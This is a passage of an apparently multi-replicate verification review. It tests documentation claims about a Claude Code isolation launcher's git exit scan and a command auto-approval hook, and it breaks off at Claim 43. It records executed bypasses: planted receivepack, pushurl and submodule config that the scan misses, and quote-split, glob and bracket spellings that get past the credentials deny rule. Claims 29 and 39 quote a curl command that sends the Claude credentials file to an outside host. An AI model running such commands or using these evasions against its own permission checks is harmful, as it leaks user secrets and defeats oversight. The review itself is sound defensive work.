## Claim 18: "exits **3** naming anything the session added or changed"

**Location:** `guides/cc-isolated-usage.md:52`
**Type:** Behavioral
**Verdict:** Incorrect
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers the same four reproductions as Claim 2. It does not enumerate every silent path.
**Replicate verdicts:** r1=Incorrect · r2=Verified (compound) · r3=Verified (compound)
**Replicate annotations:**
- r2 (compound Verified): "covers ordering and exit codes; does not establish scan completeness (its Claims 3b and 6, which are Incorrect)."
- r3 (compound Verified, via its Claim 11): the end-to-end exit-code mapping is verified. r3 records the completeness gaps separately (its Claims 4 and 7).
- r1 (escalation): see Escalations.
**Legibility-target:** for-author

In X3 (submodule gitdir fsmonitor), X4 (`remote.*.receivepack`), X6 (search-only hooks dir) and X7 (`remote.*.pushurl`), host git was left able to run a planted program while the scan returned 0. The launcher therefore exits with claude's status, not 3.

**Evidence:** `guides/cc-isolated-usage.md:52`, `devcontainer-config/cc-isolated.sh:616-658`; `…/scratchpad/logs/extra.log`, `…/scratchpad/logs/extra2.log`, `…/scratchpad/logs/extra3.log`

---

## Claim 19: "It exits 4 when the exit scan cannot read `.git`" (and git_exit_scan "2 when the exit state could not be read")

**Location:** `guides/cc-isolated-usage.md:54`
**Type:** Error-handling
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers a `.git` whose location cannot be resolved, or whose config or hook file is unreadable. It does not establish the unlistable-directory case, which returns 0 (Claim 9).
**Replicate verdicts:** r1=Verified (compound) · r2=Verified (compound) · r3=Verified
**Replicate annotations:**
- r3: "the claim as verdicted also covers `git_exit_scan`'s comment at `devcontainer-config/cc-isolated.sh:679-693`."
**Legibility-target:** for-orchestrator-synthesis

When `git_exec_snapshot` fails at exit, `git_exit_scan` prints the reason through `scan_vis` and returns 2 (`:686-693`). The launcher maps 2 to exit 4. The suite test (status 2) passes, and so do end-to-end probes r3 X2 and r1 X2 (exit 4).

**Evidence:** `devcontainer-config/cc-isolated.sh:679-693`, `guides/cc-isolated-usage.md:54`; `$SP/r3logs/r3-probe.log`, `…/scratchpad/logs/extra.log`

---

## Claim 20: "…and refuses to launch when the baseline snapshot cannot be taken."

**Location:** `guides/cc-isolated-usage.md:54-55`
**Type:** Behavioral
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers the code order (the snapshot precedes every `devcontainer up` in `main`) and the refusal path. It does not establish that the container is stopped when the snapshot is taken: a container left from an earlier session is still running then.
**Replicate verdicts:** r1=Verified (compound) · r2=Verified (compound) · r3=Verified (compound)
**Replicate annotations:**
- r1+r2: "same evidence as Claim 13 (the suite's refuse test)."
**Legibility-target:** for-orchestrator-synthesis

The snapshot block (`:806-814`) precedes `devcontainer up` (`:832`) and the `--probe-only` rebuild (`:827`). On failure it runs `exit 1` (`:813`). The suite's refuse test passes.

**Evidence:** `devcontainer-config/cc-isolated.sh:806-814`, `devcontainer-config/cc-isolated.sh:825-832`, `guides/cc-isolated-usage.md:54-55`; `$SP/r3logs/cc-isolated-functions.log`

---

## Claim 21: "It names every new or changed hook (in `.git/hooks` or a configured `core.hooksPath`), every `filter.*`, `core.fsmonitor`, `include*` and `hook.*` key …, a non-empty `info/attributes`, a repointed `.git` file, and the keys that make `git push` or an everyday command run a program (…), with how to remove each. Then it exits 3, never 0."

**Location:** `guides/cc-isolated-usage.md:166-176`
**Type:** Behavioral
**Verdict:** Incorrect
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers the two "every"/completeness assertions. It does not dispute that the enumerated keys and the attributes file are detected (their bats cases pass).
**Replicate verdicts:** r1=Mostly accurate · r2=Incorrect · r3=Incorrect (compound)
**Replicate annotations:**
- r1 (Mostly accurate): "each listed category has a passing suite test. Two qualifications are needed: 'every hook in a directory the scan can list', and that `remote.*` keys are not included. It does not establish anything about submodule gitdirs, which this sentence does not mention."
- r3 (compound Incorrect, via its Claims 4 and 7, which cite `guides/cc-isolated-usage.md:167-174` and `:169`): "'names every new or changed hook' falls with the search-only hooks dir; the push-key framing omits receivepack and submodule git dirs."
**Legibility-target:** for-author

r2 gives two executed counterexamples:
1. **Hooks.** A new executable `pre-push` in a hooks directory made unlistable (`chmod 311`) is not named, the scan returns 0 (so the launcher does not exit 3), and host `git push` runs it.
2. **Push keys.** `remote.origin.receivepack` with `remote.origin.url` repointed to a local bare repo is not named, and host `git push` runs it.

"Never 0" holds only when the scan detects something.

**Evidence:** `guides/cc-isolated-usage.md:166-176`, `devcontainer-config/cc-isolated.sh:565`, `devcontainer-config/cc-isolated.sh:642-659`; `docs/reviews/execution-logs/r2-unlistable-hookdir.log`, `docs/reviews/execution-logs/r2-receivepack-bypass.log`

---

## Claim 22: "The scan runs nothing from the checkout: it finds the git dir by reading files and reads config with `git config --file … --no-includes` from `/`."

**Location:** `guides/cc-isolated-usage.md:176-178`
**Type:** Invariant
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Same as Claim 3: the scan functions only, not the launcher's launch-time `git rev-parse`/`git config --get` on the checkout.
**Replicate verdicts:** r1=Verified · r2=Verified · r3=—
**Replicate annotations:** none
**Legibility-target:** for-orchestrator-synthesis

The only git call in the scan is at `cc-isolated.sh:618`, and the no-marker tests pass (see Claim 3).

**Evidence:** `guides/cc-isolated-usage.md:176-178`, `devcontainer-config/cc-isolated.sh:618`; `…/scratchpad/logs/cc-isolated-functions.log`, `docs/reviews/execution-logs/r2-cc-isolated-exit-scan.log`

---

## Claim 23: "Its limits:" — the four bullets "Baseline, not audit", "After the scan", "No scan … Ctrl-C that ends the session still scans", "Outside `.git`"

**Location:** `guides/cc-isolated-usage.md:179-189`
**Type:** Behavioral
**Verdict:** Incorrect
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers the claim that the four listed limits are the scan's limits. Each bullet is accurate on its own (see Claims 7 and 14); the verdict attaches to the omission of limits that a reader relies on this list to learn.
**Replicate verdicts:** r1=Incorrect (compound) · r2=Verified (compound) · r3=Verified
**Replicate annotations:**
- r2 (Verified, Medium): "each stated limit holds against the code. It does not establish that the list is complete: the unlistable-hooks-dir and `remote.*.receivepack` gaps are further limits not listed. 'Ctrl-C still scans' is verified only by simulation, not in a live session."
- r3 (Verified): "does not establish that the list is complete. Unlisted gaps inside .git exist: submodule git dirs, `remote.*.receivepack`, and an unlistable hooks dir."
- r1+r2 (compound): verdicted together with "that config is scanned" (Claim 24).
- r1 (escalation): see Escalations.
**Legibility-target:** for-author

r1 found three unlisted gaps inside `.git` itself, each of which lets a session leave host git able to run a program while the scan returns 0:
- **Submodule gitdirs.** Nothing under `.git/modules/*` is read (X3).
- **`remote.*` keys.** X4 (`receivepack`) and X7 (`pushurl` to a session-built bare repo whose hook runs on `git push`).
- **Unlistable hook dirs.** X6.

**Evidence:** `guides/cc-isolated-usage.md:178-189`, `devcontainer-config/cc-isolated.sh:616-658`, `devcontainer-config/cc-isolated.sh:694`, `devcontainer-config/cc-isolated.sh:870`; `…/scratchpad/logs/extra.log`, `…/scratchpad/logs/extra2.log`, `…/scratchpad/logs/extra3.log`, `$SP/r3logs/r3-int.log`

---

## Claim 24: "a tracked attribute only runs a driver that config defines, and that config is scanned"

**Location:** `guides/cc-isolated-usage.md:187-189`
**Type:** Behavioral
**Verdict:** Incorrect
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers driver definitions in the checkout's config files. It does not establish coverage of drivers defined in the host's `~/.gitconfig` or system config, which are not scanned.
**Replicate verdicts:** r1=Incorrect (compound) · r2=Verified (compound) · r3=Mostly accurate
**Replicate annotations:**
- r3 (Mostly accurate, Medium, static): "'that config is scanned' holds for the checkout's config only. A tracked `.gitattributes` can route files to any driver a host defines globally (e.g. `filter.lfs`), and a submodule's config is not read at all. Precise version: '…runs a driver that some git config defines; the checkout's own config is scanned, your global config is not'."
- r2 (compound Verified): "'that config is scanned' holds for the repo's config and config.worktree, not the host's `~/.gitconfig`, which the guide itself excludes."
**Legibility-target:** for-author

r1: "That config is scanned" is false for a driver defined in `.git/modules/<n>/config`. The scan reads only `$common/config` and `$gd/config.worktree` (`cc-isolated.sh:614-618`), and r1's X3 showed that a planted submodule config is acted on by host git.

**Evidence:** `guides/cc-isolated-usage.md:187-189`, `devcontainer-config/cc-isolated.sh:565`, `devcontainer-config/cc-isolated.sh:614-618`; `…/scratchpad/logs/extra.log` (X3)

---

## Claim 25: "push with hooks and fsmonitor disabled (`git -c core.hooksPath=/dev/null -c core.fsmonitor=false push`) … The first does not cover filter drivers, includes or `core.sshCommand`"

**Location:** `guides/cc-isolated-usage.md:190-194`
**Type:** Behavioral
**Verdict:** Mostly accurate
**Confidence:** High
**Verification mode:** executed
**Scope:** Same as Claim 12: the list of uncovered items omits `remote.*.receivepack` (executed) and credential helpers (not executed).
**Replicate verdicts:** r1=Mostly accurate · r2=Mostly accurate (compound) · r3=Mostly accurate (compound)
**Replicate annotations:**
- r2: "precise version: '…does not cover filter drivers, includes, `core.sshCommand` or `remote.*.receivepack`/url rewrites'."
- r3: "credential helpers, `gpg.*`, `alias.*` and `protocol.*` are also not neutralized. Precise version: 'hooks and fsmonitor only'."
- r2+r3 (compound): verdicted together with `cc-isolated.sh:709-711` (Claim 12).
**Legibility-target:** for-author

In X4, this exact command still ran a planted `remote.origin.receivepack` (marker `ran/receivepack`). r2 and r3 reproduced the result.

**Evidence:** `guides/cc-isolated-usage.md:190-194`; `…/scratchpad/logs/extra.log`, `docs/reviews/execution-logs/r2-safe-push-receivepack.log`, `$SP/r3logs/r3-probe.log`

---

## Claim 26: "the separate clone runs none of this checkout's hooks, filters or ssh settings when you push"

**Location:** `guides/cc-isolated-usage.md:194-196`
**Type:** Behavioral
**Verdict:** Verified
**Confidence:** Medium
**Verification mode:** executed
**Scope:** Covers a `git fetch` from a checkout with planted `core.fsmonitor`, `core.sshCommand`, `uploadpack.packObjectsHook`, `core.pager`, `core.editor` and five hooks, followed by a fast-forward merge in the clean clone (no marker created). It does not establish every key (e.g. a planted `.gitattributes` committed into the fetched history routes the clone's own drivers), nor fetches over transports other than a local path.
**Replicate verdicts:** r1=Verified · r2=Verified · r3=Verified
**Replicate annotations:**
- r1 (static, Medium): "does not establish the preceding `fetch` from the checkout, which spawns `git-upload-pack` in the checkout and reads its config. `uploadpack.packObjectsHook` is honoured only from protected config (reviewer's git knowledge, not executed)."
- r2 (executed, High): "covers git 2.39.5 with the clone fetching by local path, with six hooks, fsmonitor, a filter plus attributes, sshCommand, `uploadpack.packObjectsHook` and `remote.origin.receivepack` planted. fetch, merge and push all rc=0 with no markers. It does not cover a clone that fetches over ssh, or `uploadpack.*` set in the host's global or system config."
**Legibility-target:** for-orchestrator-synthesis

In r3's scratch run, `git -C clean fetch origin` and `merge --ff-only` left no marker ("fetch from untrusted repo: no markers").

**Evidence:** `guides/cc-isolated-usage.md:190-196`; `docs/reviews/execution-logs/r2-separate-clone.log`, r3 scratch run under `$SP/tmp.*` (output quoted in r3)

---

## Claim 27: "It never approves a command that matches a `Bash(...)` deny rule, so the wired `Bash(*.credentials.json*)` backstops the credentials file where no sandbox runs"

**Location:** `guides/bare-host-hook-wiring.md:151-153`
**Type:** Behavioral
**Verdict:** Mostly accurate
**Confidence:** Medium
**Verification mode:** executed
**Scope:** Covers deny rules whose only metacharacter is `*`, which includes the wired rule; for those the claim holds. It does not hold for rules containing `?`, `[…]` or extglob syntax, which the hook interprets as bash glob syntax.
**Replicate verdicts:** r1=Mostly accurate · r2=Verified · r3=Mostly accurate (compound)
**Replicate annotations:**
- r1: "Claude Code's documented wildcard is `*` only; that is reviewer knowledge, not re-checked (no egress)."
- r2 (Verified): "covers the hook's own decision. It does not establish that Claude Code then prompts or denies, or that the rules behave the same way under Claude Code's own matcher (Claim 42)."
- r3 (compound Mostly accurate): "a bare `Bash` deny rule fails the `^Bash\(` filter and is ignored (`--deny '["Bash"]'` still allowed `ls -la`). `--deny '["Bash(ls [x])"]'` still allowed the literal `ls [x]`. The bare-host wording ('a `Bash(...)` deny rule') excludes the bare-`Bash` case, but the bracket case applies to it."
**Legibility-target:** for-author

The rule body is used as a bash glob: `if [[ "$str" == $glob ]]` (`hooks/auto-approve-allowed-commands.sh:148-150`). In `probe_hook2.sh`, with deny `["Bash(cat notes[1].txt)"]` and allow `Bash(cat:*)`, the hook returned `"permissionDecision":"allow"` for the literal `cat notes[1].txt`.

**Evidence:** `guides/bare-host-hook-wiring.md:151-153`, `hooks/auto-approve-allowed-commands.sh:141-154`, `hooks/wiring.json:130`; `…/scratchpad/logs/probe_hook2.log`, `$SP/r3logs/hook-probe.log`

---

## Claim 28: "The image has no bwrap or socat and the container refuses unprivileged user namespaces (`unshare -Ur` → EPERM)"

**Location:** `docs/decisions/log.md:76`
**Type:** Configuration
**Verdict:** Unverifiable
**Confidence:** Medium
**Verification mode:** static
**Scope:** Covers only the repo-side part: `devcontainer-config/Dockerfile` never installs bwrap, bubblewrap or socat. It does not establish the base image's contents or the container's userns behaviour.
**Replicate verdicts:** r1=Unverifiable (compound) · r2=Verified · r3=Verified (compound)
**Replicate annotations:**
- r2 (Verified, Medium, executed): "`which bwrap socat unshare; unshare -Ur true` → `bwrap not found`, `socat not found`, `unshare: unshare failed: Operation not permitted`, rc=1 (inline, not captured). Covers this session's container, assumed to be the cc-isolated image; does not establish other hosts or a rebuilt image."
- r3 (compound Verified, High, executed): "same outputs at 2026-09-27T21:40:29Z (`$SP/r3logs/sandbox-probe.log`). Covers the container with `/etc/cc-config-hash` = `63fa8fc01e97ca3e`; does not establish other images."
- r1 (compound): verdicted together with #39344 (Claim 31).
**Legibility-target:** for-orchestrator-synthesis

r1: `grep -i "bwrap\|bubblewrap\|socat" devcontainer-config/Dockerfile` returned nothing. The rest needs a live container, and r1 recorded that its sandbox had no Docker.

**Evidence:** `devcontainer-config/Dockerfile`, `docs/decisions/log.md:76`; `$SP/r3logs/sandbox-probe.log`

---

## Claim 29: "the reviewer's `curl -d @…/.credentials.json` inside `$(( ))` was auto-approved (re-run first-hand: `allow`)"

**Location:** `docs/decisions/log.md:76`
**Type:** Behavioral
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers the hook's decision with no Bash deny rule. It does not establish Claude Code's behaviour after receiving the hook's `allow`.
**Replicate verdicts:** r1=Verified (compound) · r2=Verified · r3=—
**Replicate annotations:**
- r1+r2: "does not establish Claude Code's own treatment of the command after the hook's decision."
- r2: "also matches commit 0864452's 'with only Bash(echo:*) allowed, the hook approved echo $((1 + $(curl …)))'."
**Legibility-target:** for-orchestrator-synthesis

The bats case "reproduction: with no Bash deny rule the $(( )) exfiltration is still approved" sets only `Bash(echo:*)` and asserts `"permissionDecision":"allow"`. It passes, and it still passes when `matches_deny` is mutated away.

**Evidence:** `test/auto-approve-allowed-commands.bats:118-126`; `docs/reviews/execution-logs/r2-auto-approve-bats.log`, `docs/reviews/execution-logs/r2-auto-approve-mutation.log`, `…/scratchpad/logs/auto-approve-allowed-commands.log`

---

## Claim 30: "`hooks/wiring.json` adds `Bash(*.credentials.json*)`, and the hook reads Bash deny rules itself and never approves a match"

**Location:** `docs/decisions/log.md:76`
**Type:** Behavioral
**Verdict:** Mostly accurate
**Confidence:** Medium
**Verification mode:** executed
**Scope:** Covers `Bash(<glob>)` and legacy `Bash(<prefix>:*)` rules, matched against the raw string and against each extracted command. It does not establish Claude Code's own rule semantics for `?`, `[` or a bare `Bash` rule (docs not reachable).
**Replicate verdicts:** r1=Verified (compound) · r2=— · r3=Mostly accurate (compound)
**Replicate annotations:**
- r1 (compound Verified): "the hook-side reproduction and the wiring entry (`hooks/wiring.json:130` holds `"Bash(*.credentials.json*)"`) are verified; this does not establish Claude Code's own treatment of the rule."
- r3 (compound): verdicted together with `hooks/auto-approve-allowed-commands.sh:45-47` (Claim 38) and the bare-host guide (Claim 27).
**Legibility-target:** for-author

r3 found two kinds of Bash deny rule that the hook does not honour as written:
- A bare `Bash` rule fails the `^Bash\(` filter. With `--deny '["Bash"]'`, the hook returned `allow` for `ls -la`.
- A `[…]` becomes a bash character class. `--deny '["Bash(ls [x])"]'` still allowed the literal `ls [x]`.

**Evidence:** `docs/decisions/log.md:76`, `hooks/wiring.json:130`, `hooks/auto-approve-allowed-commands.sh:104-152`; `$SP/r3logs/hook-probe.log`, `$SP/hookprobe.sh`

---

## Claim 31: "a hook decision can override `permissions.deny` (#39344, shown for `ask`; not verified for `allow`)"

**Location:** `docs/decisions/log.md:76`
**Type:** Reference
**Verdict:** Unverifiable
**Confidence:** Low
**Verification mode:** static
**Scope:** Covers nothing: this is Claude Code runtime behaviour and an external GitHub issue, and the sandbox has no egress.
**Replicate verdicts:** r1=Unverifiable (compound) · r2=Unverifiable · r3=Unverifiable (compound)
**Replicate annotations:**
- r3 (compound, executed): "the hook half is executed and holds. Claude Code's behaviour and issue #39344's content need a live Claude Code host and network access."
- r1 (compound): "verifying needs … access to the Claude Code issue tracker."
- r2: "to verify: fetch anthropics/claude-code#39344 from the host, and run a live hook-`ask`-vs-deny test."
**Legibility-target:** for-orchestrator-synthesis

The claim concerns an external issue tracker and Claude Code internals that are not in this repo.

**Evidence:** `docs/decisions/log.md:76`

---

## Claim 32: "That is a string match: a spelling without the literal name (`.cred""entials.json`, a glob, a variable) still gets through, pinned by a test."

**Location:** `docs/decisions/log.md:76`
**Type:** Behavioral
**Verdict:** Mostly accurate
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers the three spellings named. It does not establish test coverage for the glob or variable spellings.
**Replicate verdicts:** r1=Verified (compound) · r2=Mostly accurate · r3=Verified (compound)
**Replicate annotations:**
- r1+r3 (compound Verified): "only the quote-split spelling is pinned by a test; the glob and variable spellings are not."
**Legibility-target:** for-author

A test pins only the quote-split spelling (`test/auto-approve-allowed-commands.bats:185`). A probe confirmed the glob spelling: `cat ~/.claude/.c*` with deny `Bash(*.credentials.json*)` → `allow`. Precise version: "…still gets through; the quote-split spelling is pinned by a test".

**Evidence:** `test/auto-approve-allowed-commands.bats:179-187`, `hooks/auto-approve-allowed-commands.sh:139-154`; `docs/reviews/execution-logs/r2-auto-approve-probes.log`

---

## Claim 33: "writes `test/skills/<skill>/output/*.report.md` with a provenance `.stamp` (hashes of the skill directory, its `runner.bash` and the fixture, not the shared harness); reports and their sidecars are committed, and a report whose stamp no longer matches fails its suite until regenerated."

**Location:** `guides/skill-creation.md:63`
**Type:** Behavioral / Configuration
**Verdict:** Mostly accurate
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers the stamp inputs, the stale-fail behaviour and trackability. It does not hold for "are committed" as a statement of current state: `git ls-files 'test/skills/*/output/*'` is empty at ce6bee6, and commit 01c40eb says "No reports regenerated".
**Replicate verdicts:** r1=Mostly accurate · r2=Mostly accurate · r3=Verified (compound)
**Replicate annotations:**
- r1+r2+r3: "no report is committed today."
- r2: "precise version: '…are tracked by git (commit them after generating)'. No `test/skills/*/output` exists on disk."
- r3 (compound Verified): verdicted together with the generate-reports, run-tests and health-check text (Claims 48, 49 and 52).
**Legibility-target:** for-author

`report_stamp` prints exactly `skill`, `runner` and `fixture` (`test/skills/runner-contract.bash:198-203`), and the stale-fail path is covered by `eval-helpers-freshness.bats`. `.gitignore` permits tracking (Claim 1), but nothing is tracked yet.

**Evidence:** `guides/skill-creation.md:63`, `test/skills/runner-contract.bash:198-203`, `.gitignore:8-12`; `…/scratchpad/logs/eval-helpers-freshness.log`, `docs/reviews/execution-logs/r2-stamp-bats.log`

---

## Claim 34: "F4 (description length) — Resolved for all 25 skills … runs 364–438 characters (was 951–2969) … moved into a `## When to use` section in each SKILL.md body (appended to the existing section in design-space-situating, pre-mortem and what-if-analysis)."

**Location:** `guides/skill-format-audit.md:20`
**Type:** Configuration
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers the count and the min/max folded-description length at HEAD and at main. It does not cover the soft "first ~250 characters in all but a few cases" statement, which was not checked.
**Replicate verdicts:** r1=Verified · r2=Verified · r3=Verified
**Replicate annotations:**
- r1+r2+r3: "the '~250 characters' placement sub-claim was not measured."
**Legibility-target:** for-orchestrator-synthesis

All three replicates measured `HEAD count 25 min 364 max 438` and `main count 25 min 951 max 2969`. 23 bodies use `## When to use`. pre-mortem and what-if-analysis keep their existing `## When to Use This Skill (vs. …)` headings.

**Evidence:** `guides/skill-format-audit.md:20`, `skills/pre-mortem/SKILL.md:32`, `skills/what-if-analysis/SKILL.md:33`; `docs/reviews/execution-logs/r2-desc-lengths.log`, `$SP/r3logs/desc-lengths.log`

---

## Claim 35: "--deny JSON  Use custom deny rules instead of reading permissions.deny from the settings files (same format)"

**Location:** `hooks/auto-approve-allowed-commands.sh:17-18`
**Type:** Behavioral
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers the switch between the settings files and `--deny`. It does not establish validation of the argument: invalid JSON silently yields zero deny rules (`2>/dev/null`), and this is a test-only option.
**Replicate verdicts:** r1=Verified · r2=Verified · r3=Verified (compound)
**Replicate annotations:**
- r1+r2: "malformed JSON silently yields no deny rules."
- r3 (compound with Claim 43): "does not establish that `--permissions` alone disables the file deny read (it does not, by design)."
**Legibility-target:** for-orchestrator-synthesis

`get_deny_globs` uses `$CUSTOM_DENY` and returns early when `CUSTOM_DENY_SET` is true (`:120-124`), and the `--deny)` case sets that flag (`:217-221`). The suite tests that use `--deny` pass.

**Evidence:** `hooks/auto-approve-allowed-commands.sh:17-18`, `hooks/auto-approve-allowed-commands.sh:120-137`, `hooks/auto-approve-allowed-commands.sh:217-221`; `…/scratchpad/logs/auto-approve-allowed-commands.log`, `docs/reviews/execution-logs/r2-auto-approve-bats.log`

---

## Claim 36: "The container has no Claude Code sandbox: bwrap and socat are not in the image, and unprivileged user namespaces are refused (`unshare -Ur` -> EPERM, measured 2026-09-27)"

**Location:** `hooks/auto-approve-allowed-commands.sh:39-42`
**Type:** Configuration
**Verdict:** Unverifiable
**Confidence:** Medium
**Verification mode:** static
**Scope:** Same as Claim 28: the Dockerfile installs no bwrap or socat. The live userns behaviour was not checked.
**Replicate verdicts:** r1=Unverifiable (compound) · r2=Verified (compound) · r3=Verified (compound)
**Replicate annotations:**
- r2 (compound, via its Claim 10a, whose evidence cites `hooks/auto-approve-allowed-commands.sh:39-42`): "`bwrap not found`, `socat not found`, `unshare … Operation not permitted` (inline, not captured)."
- r3 (compound Verified, High, executed; location also covers commit 0864452): "`$SP/r3logs/sandbox-probe.log`; covers this cc-isolated container (`/etc/cc-config-hash` = `63fa8fc01e97ca3e`); does not establish other images or future Dockerfile changes."
- r1 (compound): verdicted together with `:43-45` (Claim 37).
**Legibility-target:** for-orchestrator-synthesis

r1's grep of `devcontainer-config/Dockerfile` for these packages returned nothing. Verifying the rest needs a live container.

**Evidence:** `hooks/auto-approve-allowed-commands.sh:39-42`, `devcontainer-config/Dockerfile`; `$SP/r3logs/sandbox-probe.log`

---

## Claim 37: "… a hook "ask" overrides permissions.deny (Claude Code issue #39344)."

**Location:** `hooks/auto-approve-allowed-commands.sh:43-45`
**Type:** Reference
**Verdict:** Unverifiable
**Confidence:** Medium
**Verification mode:** static
**Scope:** Same as Claim 31: the upstream issue and Claude Code's live behaviour were not checked.
**Replicate verdicts:** r1=Unverifiable (compound) · r2=Unverifiable (compound) · r3=Unverifiable (compound)
**Replicate annotations:**
- r2 (compound; its location also lists `hooks/wiring.json:33-34`): "needs anthropics/claude-code#39344 and a live test."
- r3 (compound): "needs a live Claude Code host and network access."
**Legibility-target:** for-orchestrator-synthesis

This is external behaviour that the review sandbox cannot reach.

**Evidence:** `hooks/auto-approve-allowed-commands.sh:39-45`

---

## Claim 38: "this hook reads the Bash deny rules itself and falls through, never "allow", when the raw command or any extracted command matches one"

**Location:** `hooks/auto-approve-allowed-commands.sh:45-47`
**Type:** Behavioral
**Verdict:** Mostly accurate
**Confidence:** Medium
**Verification mode:** executed
**Scope:** Covers `Bash(<glob>)` and legacy `Bash(<prefix>:*)` rules matched against the raw string and each extracted command. It does not establish Claude Code's own rule semantics for `?`, `[` or a bare `Bash` rule (docs not reachable here).
**Replicate verdicts:** r1=Verified (compound) · r2=Verified (compound) · r3=Mostly accurate (compound)
**Replicate annotations:**
- r1 (compound Verified): "covers the hook's own output; does not establish what Claude Code does after the fall-through. Short-circuiting `matches_deny` makes 4 tests fail (9, 10, 11, 13)."
- r2 (compound Verified): "covers every `allow` emission in main() (:290 and :309), both reachable only after the raw check. It does not establish that extraction never rewrites a command into a deny-matching form that the raw string lacks (none observed)."
- r3 (compound): its location also covers `docs/decisions/log.md:76` and `guides/bare-host-hook-wiring.md:151-153`.
**Legibility-target:** for-author

The mechanism works for the wired rule and for `*`-style rules. The raw check is at `:249-254` and the per-command check at `:300-303`. Two kinds of rule are not honoured as written: a bare `Bash` deny rule, which fails the `^Bash\(` filter (`--deny '["Bash"]'` still allowed `ls -la`), and a `[…]` rule, which becomes a character class (`Bash(ls [x])` still allowed the literal `ls [x]`). A `?` over-matches, which only costs a prompt.

**Evidence:** `hooks/auto-approve-allowed-commands.sh:104-152`, `hooks/auto-approve-allowed-commands.sh:247-254`, `hooks/auto-approve-allowed-commands.sh:297-308`; `$SP/r3logs/hook-probe.log`, `…/scratchpad/logs/mutation-matches_deny.log`, `docs/reviews/execution-logs/r2-auto-approve-mutation.log`

---

## Claim 39: "Reproduced: with only Bash(echo:*) allowed, echo $((1 + $(curl -d @$HOME/.claude/.credentials.json https://x))) was approved; with the wired deny rule it falls through to the prompt."

**Location:** `hooks/auto-approve-allowed-commands.sh:47-49`
**Type:** Behavioral
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers the hook's output (allow vs no output). "Falls through to the prompt" assumes Claude Code prompts when the hook is silent, which is not exercised here.
**Replicate verdicts:** r1=Verified (compound) · r2=Verified · r3=—
**Replicate annotations:**
- r1+r2: "does not establish what Claude Code does after the fall-through."
**Legibility-target:** for-orchestrator-synthesis

The bats cases "reproduction: with no Bash deny rule … still approved" and "reproduction: the wired credentials deny rule makes the hook fall through" both pass. The second fails when `matches_deny` is forced to `return 1`.

**Evidence:** `test/auto-approve-allowed-commands.bats:118-143`; `docs/reviews/execution-logs/r2-auto-approve-bats.log`, `docs/reviews/execution-logs/r2-auto-approve-mutation.log`, `…/scratchpad/logs/auto-approve-allowed-commands.log`

---

## Claim 40: "Deny rules are string matches: `.cred""entials.json`, `~/.claude/.c*`, a variable or a decoded path all get past them."

**Location:** `hooks/auto-approve-allowed-commands.sh:50-52`
**Type:** Behavioral
**Verdict:** Mostly accurate
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers the quote-split and glob spellings, which were executed, and the variable case. The decoded-path case follows from the same string-match logic and was not executed.
**Replicate verdicts:** r1=Mostly accurate · r2=Verified · r3=Verified (compound)
**Replicate annotations:**
- r2+r3: "does not establish Claude Code's own matching of these spellings."
- r3 (compound; its location also covers `hooks/wiring.json:42-43` and `docs/decisions/log.md:76`): "none of these spellings contains the literal substring `.credentials.json`. Only the quote-split form is pinned by a test."
**Legibility-target:** for-author

- The quote split is approved (suite test), and `cat ~/.claude/.c*` with deny `Bash(*.credentials.json*)` → `allow`.
- "A variable" gets past only when the variable's value is not spelled in the same command string. `f=.claude/.credentials.json; cat ~/$f` is not approved, because the raw string contains the literal name. Precise version: "a variable whose value comes from outside the command".

**Evidence:** `hooks/auto-approve-allowed-commands.sh:50-52`, `hooks/auto-approve-allowed-commands.sh:247-252`; `…/scratchpad/logs/probe_hook.log`, `docs/reviews/execution-logs/r2-auto-approve-probes.log`

---

## Claim 41: "Turn Bash deny rules … into bash glob patterns: Bash(X) -> X, and the legacy prefix form Bash(X:*) -> X*."

**Location:** `hooks/auto-approve-allowed-commands.sh:104-105`
**Type:** Behavioral
**Verdict:** Verified
**Confidence:** High
**Verification mode:** executed
**Scope:** Covers the translation the code performs. It does not establish equivalence with Claude Code's rule semantics, and the comment does not claim it. `X*` drops Claude Code's word boundary (`rm:*` also matches `rmdir x`), and `?`/`[…]` become glob syntax (Claim 27).
**Replicate verdicts:** r1=Verified · r2=Verified (compound) · r3=Verified (compound)
**Replicate annotations:**
- r2: "the modern `Bash(rm *)` form does not match a bare `rm` (probe → allow). Deny `Bash(cat [x])` blocks `cat x`, so a literal `cat [x]` would not match it."
- r3: "does not establish Claude Code's own `:*` semantics (word-boundary or not)."
- r2+r3 (compound): verdicted together with commit `0864452`'s over-match note (Claim 58).
**Legibility-target:** for-orchestrator-synthesis

`deny_rules_to_globs` runs `grep -E '^Bash\(.*\)$' | sed -E 's/^Bash\(//; s/\)$//; s/:\*$/*/'` (`:106-110`).

**Evidence:** `hooks/auto-approve-allowed-commands.sh:104-110`; `…/scratchpad/logs/probe_hook.log`, `docs/reviews/execution-logs/r2-auto-approve-probes.log`, `$SP/r3logs/hook-probe.log`

---

## Claim 42: (brief) the hook's glob `*` and legacy `:*` semantics match Claude Code's documented deny-rule semantics

**Location:** `hooks/auto-approve-allowed-commands.sh:104-110`
**Type:** Behavioral
**Verdict:** Unverifiable
**Confidence:** Low
**Verification mode:** static
**Scope:** Covers nothing. Claude Code's matcher is external: its word-boundary rule for ` *`, whether `Bash(x *)` matches a bare `x`, whether `?` and `[` are literal, and how it splits commands.
**Replicate verdicts:** r1=— · r2=Unverifiable · r3=— · single-replicate detection
**Replicate annotations:**
- r2: "no in-repo claim asserts parity. The commit says Claude Code's interpretation of the leading-wildcard rule 'is unverified here'. To verify: the Claude Code permissions docs, plus a live deny test on the host."
**Legibility-target:** for-orchestrator-synthesis

The reference behaviour lives in the Claude Code docs, which the review sandbox could not reach (no egress).

**Evidence:** `hooks/auto-approve-allowed-commands.sh:104-110`

---

## Claim 43: "Bash deny globs from the same three settings files the allow list comes from (or from --deny when testing)."

